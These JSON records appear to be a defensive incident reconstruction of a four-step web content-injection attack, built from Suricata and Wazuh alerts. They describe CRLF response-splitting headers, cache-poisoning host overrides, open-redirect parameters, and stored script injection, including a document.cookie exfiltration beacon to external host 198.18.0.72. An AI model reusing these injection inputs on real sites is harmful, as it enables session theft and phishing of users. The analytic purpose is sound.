    {"step": 1, "tactic": "Initial Access — Content Injection (Baseline Reconnaissance)", "technique": "T1659", "what_happened": "At 2026-05-13 09:14:07 CEST, Suricata logged a short burst of HTTP GET requests from data.srcip=10.108.57.1 to the corporate web app data.dstip=10.108.57.184 across six distinct paths (/, /about, /contact, /products, /login, /api/health). The requests rotated through four browser User-Agent strings and were spaced ~15s apart. In isolation this looks like benign browsing, but the systematic six-path enumeration with UA rotation is the baseline-fingerprinting step an on-path proxy attacker performs to capture the normal response body (script counts, headers) before injecting modified content — so later modifications can be made to blend in.", "chain_reason": "Suricata HTTP event logs with data.srcip=10.108.57.1, data.dstip=10.108.57.184, data.http.url cycling through six static paths, data.http.user_agent rotating across four values within a 3-minute window — the canonical 'capture baseline before tampering' precursor to response modification.", "first_seen": "2026-05-13T09:14:07+0200"},
    {"step": 2, "tactic": "Initial Access — Content Injection (HTTP Response Splitting / CRLF Injection)", "technique": "T1659", "what_happened": "At 09:16:55 CEST the same data.srcip=10.108.57.1 began sending HTTP requests carrying URL-encoded CRLF sequences (%0d%0a) in query parameters against /search, /redirect, /api/info and /comments. The injected sequences attempted to split the HTTP response and append attacker-controlled headers (X-Injected-Header, Set-Cookie: session=malicious, Location: http://198.18.0.72/redirect, and a Content-Type override prepending <script>alert(1)</script>). Suricata fired 'ET WEB_SERVER HTTP Response Splitting' (sid 2012408) and 'ET WEB_SERVER Possible HTTP Header Injection' (sid 2012065). This is the core response-modification step — an on-path attacker forging headers into responses traversing the proxy hop.", "chain_reason": "Suricata signatures sid 2012408 and sid 2012065 with data.srcip=10.108.57.1, data.dstip=10.108.57.184, data.http.url containing %0d%0a / %0a CRLF sequences, plus Wazuh web rule 31103 (web attack — content injection). Same source IP as step 1, ~3 minutes later — recon-to-injection progression.", "first_seen": "2026-05-13T09:16:55+0200"},
    {"step": 3, "tactic": "Initial Access — Content Injection (Header Reflection & Cache Poisoning Probes)", "technique": "T1659", "what_happened": "At 09:19:30 CEST data.srcip=10.108.57.1 sent requests with rogue proxy / host-override headers — X-Forwarded-Host, X-Original-URL, Proxy: http://198.18.0.72:8080, Host: 198.18.0.72 — and cache-poisoning headers X-Forwarded-Proto: javascript, X-Forwarded-Server: 198.18.0.72 against / and /api/info. The goal: make the application reflect attacker-controlled host/proxy values into responses or into a shared cache so injected content is served to other users. The presence of a 'Proxy:' request header and a Host header pointing at an external IP is the smoking-gun indicator of a rogue on-path proxy hop.", "chain_reason": "Suricata HTTP events with data.srcip=10.108.57.1, data.dstip=10.108.57.184 carrying X-Forwarded-Host / Proxy / Host headers referencing data.dstip=198.18.0.72; Wazuh web rule 31103. Continuation of the same session, escalating from header injection to cache poisoning.", "first_seen": "2026-05-13T09:19:30+0200"},
    {"step": 4, "tactic": "Initial Access — Content Injection (Injected Redirect & Script-in-Body to External C2)", "technique": "T1659", "what_happened": "From 09:22:48 CEST data.srcip=10.108.57.1 escalated to the payload-delivery phase: open-redirect probes embedding http://198.18.0.72/phishing, /steal, /fake-login in next/redirect_uri/returnTo parameters across /logout, /redirect, /api/auth/callback, /sso and /login; followed by POST requests to /api/comments carrying URL-encoded <script src='http://198.18.0.72/track.js'>, a window.location redirect to 198.18.0.72/phish, and a document.cookie exfiltration beacon to 198.18.0.72/1x1.gif — all tagged source=proxy-injected with an X-Forwarded-For: 10.108.57.1 header. Verification GETs to /, /comments, /api/comments and /dashboard then checked whether the injected <script> tags persisted in the rendered page. This is the full content-injection objective: deliver attacker JavaScript and redirects pointing at external C2 198.18.0.72.", "chain_reason": "Suricata HTTP/DNS/TLS events with data.srcip=10.108.57.1, data.dstip=10.108.57.184, data.http.url referencing 198.18.0.72 in redirect parameters and POST bodies; outbound references to external data.dstip=198.18.0.72; Wazuh web rule 31103. Final stage of the same on-path session: recon → CRLF split → cache poison → script/redirect injection to C2.", "first_seen": "2026-05-13T09:22:48+0200"}
